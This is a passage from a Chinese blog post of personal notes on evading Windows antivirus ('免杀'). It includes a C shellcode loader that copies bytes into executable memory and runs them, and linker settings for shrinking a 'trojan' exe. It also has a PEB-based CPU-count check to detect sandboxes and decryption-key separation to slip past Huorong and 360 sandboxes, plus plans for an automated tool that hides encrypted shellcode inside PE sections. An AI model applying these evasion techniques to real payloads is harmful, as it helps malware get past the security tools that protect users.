escape_">\x26</span><span class="hljs-char escape_">\x31</span>\xff&quot;</span><br>        <span class="hljs-string">&quot;\xac\x3c<span class="hljs-char escape_">\x61</span>\x7c<span class="hljs-char escape_">\x02</span>\x2c<span class="hljs-char escape_">\x20</span>\xc1\xcf\x0d<span class="hljs-char escape_">\x01</span>\xc7\xe2\xf2<span class="hljs-char escape_">\x52</span>&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x57</span>\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x10</span>\x8b\x4a\x3c\x8b\x4c<span class="hljs-char escape_">\x11</span><span class="hljs-char escape_">\x78</span>\xe3<span class="hljs-char escape_">\x48</span><span class="hljs-char escape_">\x01</span>\xd1&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x51</span>\x8b<span class="hljs-char escape_">\x59</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x01</span>\xd3\x8b<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x18</span>\xe3\x3a<span class="hljs-char escape_">\x49</span>\x8b<span class="hljs-char escape_">\x34</span>\x8b&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x01</span>\xd6<span class="hljs-char escape_">\x31</span>\xff\xac\xc1\xcf\x0d<span class="hljs-char escape_">\x01</span>\xc7<span class="hljs-char escape_">\x38</span>\xe0<span class="hljs-char escape_">\x75</span>\xf6<span class="hljs-char escape_">\x03</span>&quot;</span><br>        <span class="hljs-string">&quot;\x7d\xf8\x3b\x7d<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x75</span>\xe4<span class="hljs-char escape_">\x58</span>\x8b<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x01</span>\xd3<span class="hljs-char escape_">\x66</span>\x8b&quot;</span><br>        <span class="hljs-string">&quot;\x0c\x4b\x8b<span class="hljs-char escape_">\x58</span>\x1c<span class="hljs-char escape_">\x01</span>\xd3\x8b<span class="hljs-char escape_">\x04</span>\x8b<span class="hljs-char escape_">\x01</span>\xd0<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x24</span>&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x24</span>\x5b\x5b<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x59</span>\x5a<span class="hljs-char escape_">\x51</span>\xff\xe0\x5f\x5f\x5a\x8b<span class="hljs-char escape_">\x12</span>\xeb&quot;</span><br>        <span class="hljs-string">&quot;\x8d\x5d\x6a<span class="hljs-char escape_">\x01</span>\x8d<span class="hljs-char escape_">\x85</span>\xb2<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x31</span>\x8b\x6f&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x87</span>\xff\xd5\xbb\xe0\x1d\x2a\x0a<span class="hljs-char escape_">\x68</span>\xa6<span class="hljs-char escape_">\x95</span>\xbd\x9d\xff\xd5&quot;</span><br>        <span class="hljs-string">&quot;\x3c<span class="hljs-char escape_">\x06</span>\x7c\x0a<span class="hljs-char escape_">\x80</span>\xfb\xe0<span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x05</span>\xbb<span class="hljs-char escape_">\x47</span><span class="hljs-char escape_">\x13</span><span class="hljs-char escape_">\x72</span>\x6f\x6a&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x53</span>\xff\xd5<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span>\x6c<span class="hljs-char escape_">\x63</span>\x2e<span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x78</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x00</span>&quot;</span>;<br>    <span class="hljs-variable">void</span> <span class="hljs-operator">*</span><span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">VirtualAlloc</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">sizeof</span> <span class="hljs-variable">buf</span>, <span class="hljs-variable">MEM_COMMIT</span>, <span class="hljs-variable">PAGE_EXECUTE_READWRITE</span>);<br>    <span class="hljs-title function_">memcpy</span>(<span class="hljs-variable">exec</span>, <span class="hljs-variable">buf</span>, <span class="hljs-variable">sizeof</span> <span class="hljs-variable">buf</span>);<br>    ((<span class="hljs-title function_">void</span>(<span class="hljs-operator">*</span>)())<span class="hljs-variable">exec</span>)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>注意事项：exe必须包含重定位表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//不固定基址，使生成的exe有重定位表</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/FIXED:NO &quot;</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p>为了使生成的木马exe体积最小，可进行如下定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 编译器 cl.exe(Visual C++ 6.0)</span><br><span class="hljs-comment">// 没有做任何优化情况下,编译大小为:16K</span><br><span class="hljs-comment">// 编译优化后: 1K (用16进制编辑器把尾部的0x00去掉: 712bytes)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;kernel32.lib&quot;</span>)</span><br><br><span class="hljs-comment">//该设置在win10成功，在win7失败</span><br><span class="hljs-comment">// 作用: 指定节区对齐为0x200字节，</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/ALIGN:0x200&quot;)</span><br><br><span class="hljs-comment">// 作用: 合并节</span><br><span class="hljs-comment">// 将.data节和.rdata节合并到.text节(代码节)</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/merge:.data=.text&quot;)</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/merge:.rdata=.text&quot;)</span><br><br><span class="hljs-comment">// 作用: 指定子[系统](https://www.2cto.com/os/)为windows (和优化无关)</span><br><span class="hljs-comment">// vc编译器默认是console,会有个黑糊糊的CMD窗口,不好看.用windows就好了</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/subsystem:windows&quot;</span>)</span><br><br><span class="hljs-comment">// 作用: 指定入口函数</span><br><span class="hljs-comment">// 子系统为windows的默认入口点WinMain和console的默认入口点main,都会引入</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/ENTRY:main&quot;</span>)</span><br><br><span class="hljs-comment">//不固定基址，使生成的exe有重定位表</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/FIXED:NO &quot;</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p>生成的测试木马exe，可以用<code>010editer</code>打开，导出成16进制数据，并且可以设置文件类型为c语言文件。方便作为shellcode放入C语言中。</p>
+<blockquote>
+<p>设置如下：</p>
+<p>文件-&gt;导出十六进制-&gt;导出类型-&gt;导出文件 修改为.txt，导出类型 选择C代码。</p>
+</blockquote>
+<p>一个加壳的bug，</p>
+<p>行为：先对exe<strong>加壳</strong>，再取出二进制数据，加密后作为shellcode，放入PELoader的数组中，进行内存加载。</p>
+<p>实际报错了，原因：加壳后的外壳代码会获取当前模块的基址，但再内存加载目标exe时，完成所有加载步骤，目标exe运行自己的外壳代码，获取的自己模块基址，此时报错，并非目标exe基址，而是PELoader这个exe的基址。</p>
+<h3 id="2-demo测试-经验"><a href="#2-demo测试-经验" class="headerlink" title="2-demo测试-经验"></a>2-demo测试-经验</h3><p>内存加载可以过360，不能过火绒</p>
+<p><strong>结论：</strong>火绒监控所有文件落地，如果是exe就跑本地沙箱，会hook掉sleep函数，沙箱内执行、循环扫描内存（shellcode内存解密后 会被扫描到），沙箱内部时间加速。现在大概是这样一个情况。</p>
+<blockquote>
+<p>在shellcode解密前，键入一个<code>__asm&#123; __emit 0xCC&#125;</code>断点，使其不能执行，再放入虚拟机，则不会报毒。</p>
+<p>关键点：shellcode未在内存解密。</p>
+</blockquote>
+<p>测试来看 应该是有把，文件落地的时候，陌生exe文件不让你点击启动，要过他的沙箱，有的时间长大概10s，然后正常再启动，异常就报毒。</p>
+<p>我现在PELoader不会报毒，shellcode会报毒，内存中解密，就被检测到</p>
+<blockquote>
+<p><strong>思考</strong>：当我对demo.exe加自定义壳后，火绒则检测不到，按理说，沙箱动态检测， 肯定会内存扫描，然后报毒的。</p>
+<p>我的答案：应该是加自定义壳后的demo.exe，在火绒沙箱中，启动失败，则火绒未能正确扫描内存。</p>
+<p>猜想原因：自定义壳要获取当前模块句柄，可能在火绒沙箱中，获取失败，即获取到沙箱进程的主模块句柄，而非demo.exe的主模块句柄（沙箱内存加载demo.exe）</p>
+<p>我自定义壳，加壳后，win10启动正常，win7启动失败。</p>
+</blockquote>
+<p>7.24_0:47解决！！！</p>
+<p>上述<strong>思考</strong>中，经过验证，猜想原因错误，正确原因是，我得自定义壳中加了反沙箱，即判断cpu数，小于4则在沙箱中！成功绕过！</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//通过判断cpu数量，检测沙箱，在沙箱中则返回false</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">checkSandBox</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flag=<span class="hljs-number">0</span>;<br>	__asm &#123;<br>		pushad;<br>		mov eax, fs: [<span class="hljs-number">0x30</span>] ;<span class="hljs-comment">//fs寄存器代表TEB，偏移0x30指向PEB</span><br>		mov ebx, dword ptr ds : [eax + <span class="hljs-number">0x64</span>] ;<br>		mov flag, ebx;<span class="hljs-comment">//记录cpu数量，小于4判定为沙箱。</span><br>		popad;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (flag &lt; <span class="hljs-number">4</span>) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>	&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>7.24_22:00</p>
+<blockquote>
+<p>总结：样本落地被查杀，不一定是静态查杀，也有可能杀软在你落地瞬间，后台跑了本地沙箱，进行动态查杀。</p>
+<p>绕过沙箱：</p>
+<ul>
+<li>延时执行，但大部门沙箱会hook掉sleep等休眠函数，可以利用for循环。</li>
+<li><strong>环境检测</strong>（常用），沙箱模拟计算机，但比真实计算机有差别，例如：CPU较小、I&#x2F;O设备缺失、特定文件不存在等等，方法较细较广。</li>
+<li>shellcode加密分离，shellcode通过本地文件读取（加密存储）、或者远程下载传入（不落地）。</li>
+</ul>
+</blockquote>
+<p>7.25_20:30</p>
+<blockquote>
+<p>联想电脑管家也是本地沙箱，和火绒类似。</p>
+<ul>
+<li><p>测试1：观察cpu使用情况，可发现样本落地时、或样本第一次运行时，（带本地沙箱的）杀软（火绒）的cpu使用率一瞬间上升，后下降，且在此启动exe时，cpu使用率则不增加，</p>
+<p><strong>结论</strong>：说明只有样本落地、第一次启动时，才使用本地沙箱查杀。之后不再使用（样本本身哈希值不变的情况下）。</p>
+</li>
+<li><p>测试2：在shellcode解密时，添加scanf，由用户命令行输入正确的密钥key，再进行解密。该方法可成功绕过本地沙箱。</p>
+<p><strong>结论</strong>：</p>
+<p><strong>本地沙箱流程</strong>：样本落地前、样本运行前，先过本地沙箱，再正式落地、运行。且不会在exe运行过程中注入进程检查内存。</p>
+<ul>
+<li><strong>shellcode与加载器分离</strong>，可以绕过沙箱的原因</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li>shellcode分离-&gt;只分离解密密钥：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//将shellcode解密密钥分开，本地文件存储。</span><br><span class="hljs-comment">//读取本地文件密钥，密钥文件不存在则返回0;</span><br>DWORD <span class="hljs-title function_">check_key</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* keyPath = <span class="hljs-string">&quot;./key.bin&quot;</span>; <span class="hljs-comment">// 输入密钥文件的路径</span><br><br>    FILE* keyFile = fopen(keyPath, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (keyFile == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-keyword">return</span> fgetc(keyFile);<br>	&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>7.26_20:30</p>
+<p>关于exe自动免杀的问题：</p>
+<blockquote>
+<p>目标环境只针对360吗？</p>
+<p>现在可以免杀，需要考虑持久免杀吗？一个月之后被杀软定位特征了怎么办？</p>
+<ul>
+<li>如果不联网，不上传云端，容易持久化</li>
+</ul>
+<p>目前只实现32位的demo，64位exe的PE结构不熟悉、没试过。</p>
+<ul>
+<li>目前只考虑32位</li>
+</ul>
+<p>需要考虑exe有命令行输入吗？</p>
+<ul>
+<li>不考虑</li>
+</ul>
+</blockquote>
+<h2 id="0x4-自动化免杀demo"><a href="#0x4-自动化免杀demo" class="headerlink" title="0x4-自动化免杀demo"></a>0x4-自动化免杀demo</h2><h3 id="1-问题："><a href="#1-问题：" class="headerlink" title="1-问题："></a>1-问题：</h3><ol>
+<li><p>没找到FireEye</p>
+</li>
+<li><p>无法有效站住0x400000的内存空间（用于加载exe）（有局限性PELoader基址0x100000,只剩3072KB内存，只能装载较小的exe）。</p>
+</li>
+<li><p>添加新节区局限，可能没有足够位置添加节表头。</p>
+</li>
+<li><p>不支持免杀有命令行参数的exe。</p>
+</li>
+<li><p>添加一个节区后，在win10虚拟机中（win10企业版-LTSC），无法运行（不添加节区可以运行）。</p>
+<img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230803135035823.png" srcset="/img/loading.gif" lazyload alt="image-20230803135035823" style="zoom: 33%;">
+
+<p>测试win10教育版，可以成功执行。</p>
+</li>
+<li><p>自动化免杀，被360查杀、特征库比较大，火绒查杀？？？应该是添加节区后，熵值过高。</p>
+<p>试试：先对shellcode加壳upx，压缩数据.</p>
+</li>
+</ol>
+<p>1-PELoader</p>
+<p><a target="_blank" rel="noopener" href="https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1/">From Memory Loading to Everything - Part 1</a></p>
+<blockquote>
+<p>讲了内存加载的两点注意事项：</p>
+<ul>
+<li><p>将内存加载的模块设置为主模块</p>
+<p>需要修改 <code> (HMODULE)(PVOID)NtCurrentPeb()-&gt;ImageBaseAddress</code>以及LDR链上的EXE模块基址</p>
+</li>
+<li><p>修改TLS 表</p>
+<p>这个没细看，不太懂……</p>
+</li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://citrusice.github.io/posts/memory-execute/">使用内存加载躲避静态查杀</a></p>
+<blockquote>
+<p>重点讨论exe内存加载的过程</p>
+<p>其中谈到几点：</p>
+<ul>
+<li>如何加载<strong>无重定位表的PE</strong>：将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序</li>
+<li>加载<strong>带命令行参数的exe</strong>：修改传递给被加载程序的命令行参数。如果只是加载一些木马就不需要考虑命令行参数的问题。</li>
+</ul>
+</blockquote>
+<p>根据需求，本PELoader重点额外做两件事</p>
+<ul>
+<li>支持加载<strong>无重定位表的PE</strong>，即为其申请到<code>0x400000</code>的内存ImageBase</li>
+<li>将内存加载的模块设置为主模块，修改PEB记录的ImageBas和LDR双链记录exe模块的ImageBase（汇编实现）。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-248962.htm">看雪：[求助]如何让指定内存地址不被占用，可以申请，比如0x400000</a>，注意看下图的回答。</p>
+<img src="https://gitee.com/cht1/Image/raw/master/image-20230731174231961.png" srcset="/img/loading.gif" lazyload alt="image-20230731174231961" style="zoom:50%;">
+
+<p>为了使内存加载的exe能申请到地址为<code>0x400000</code>的内存，需要在编译加载器时，设置为固定基址，基址为0x100000;</p>
+<img src="https://gitee.com/cht1/Image/raw/master/image-20230731173849523.png" srcset="/img/loading.gif" lazyload alt="image-20230731173849523" style="zoom: 33%;">
+
+<h3 id="2-AutoBypass-Demo"><a href="#2-AutoBypass-Demo" class="headerlink" title="2-AutoBypass-Demo"></a>2-AutoBypass-Demo</h3><ol>
+<li><p>无法有效站住0x400000的内存空间（用于加载exe）（有局限性PELoader基址0x100000,只剩3072KB内存，只能装载较小的exe）。</p>
+</li>
+<li><p>添加新节区局限，可能没有足够位置添加节表头。</p>
+</li>
+<li><p>不支持免杀有命令行参数的exe。</p>
+</li>
+<li><p>添加一个节区后，在win10虚拟机中（win10企业版-LTSC），无法运行（不添加节区可以运行）。</p>
+<img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230803135035823.png" srcset="/img/loading.gif" lazyload alt="image-20230803135035823" style="zoom: 33%;">
+
+<p>测试win10教育版，可以成功执行。</p>
+</li>
+<li><p>自动化免杀，被360查杀、特征库比较大，火绒查杀？？？应该是添加节区后，熵值过高。</p>
+<p>试试：先对shellcode加壳upx，压缩数据.</p>
+</li>
+</ol>
+<ul>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p>被360查杀，根据这边文章提示：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10821">失败mimikatz源码免杀和成功的免杀Windows Defender</a>，</p>
+<img src="https://gitee.com/cht1/Image/raw/master/image-20230803163354393.png" srcset="/img/loading.gif" lazyload alt="image-20230803163354393" style="zoom: 25%;">
+
+<p>测试<strong>360安全卫士</strong>断网之后，就没有反映了，连未免杀的名都文件都不报毒了，直接不响应了。</p>
+<blockquote>
+<p> 应该是360的主要<strong>病毒特征库</strong>在云端，本地<strong>病毒特征库</strong>较小。</p>
+</blockquote>
+<p>测试<strong>360杀毒</strong>，断网之后，功力大减。不过：常见病毒要报毒，免杀之后不报毒。</p>
+<h3 id="3-自动化免杀-改进"><a href="#3-自动化免杀-改进" class="headerlink" title="3-自动化免杀 改进"></a>3-自动化免杀 改进</h3><p><strong>查杀点</strong>：</p>
+<blockquote>
+<p>猜测：</p>
+<p>PELoader代码，有相似度，使查杀评分增高？然后最后一个节区大量未知数据，评分进一步增高，就被判定为病毒木马了。</p>
+<ul>
+<li>而且，莫名添加一个节区，目录项里没有记录，使得目标很明显。</li>
+</ul>
+</blockquote>
+<p><strong>自动化免杀</strong>改进方法：</p>
+<ul>
+<li>将shellcode添加到已有的区段里。<ul>
+<li>末尾的节区：rsrc资源节区，在资源节区开头存放4字节RVA跳转到shellcode密文</li>
+<li>非末尾的节区：需要修改很多，最基本的 修改所有偏移，</li>
+<li>生成PELoader时，固定开辟一个很大的data段，用来存储shellcode密文。</li>
+</ul>
+</li>
+<li>密文嵌入c代码、后台编译。<ul>
+<li>把shellcode密文数据写入到一个头文件中，然后在后台再编译出来。</li>
+</ul>
+</li>
+</ul>
+<h4 id="（1）测试1"><a href="#（1）测试1" class="headerlink" title="（1）测试1"></a>（1）测试1</h4><ol>
+<li>将shellcode密文写入头文件，编译进去。查看是否被免杀。</li>
+<li>查看<code>.h</code>头文件内容格式，查看如何写入。</li>
+</ol>
+<p><strong>查杀点</strong>：</p>
+<ul>
+<li><p>vs编译的PELoader被查杀，vc编译的PELoader免杀。</p>
+<blockquote>
+<p>应该是，vs设置了ImageBase为0x100000，而非正常的0x400000，提高了查杀打分。</p>
+</blockquote>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/window/">#window</a>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023.7.17-window免杀技术【更新ing】</div>
+      <div>http://example.com/2023/07/17/2023.7.17-window免杀技术【更新ing】/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/17/2023.7.17-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E3%80%90%E6%9B%B4%E6%96%B0ing%E3%80%91/" title="2023.7.17-机器学习入门【更新ing】">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023.7.17-机器学习入门【更新ing】</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/30/2023.5.30-python%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="2023.5.30-python复习笔记">
+                        <span class="hidden-mobile">2023.5.30-python复习笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
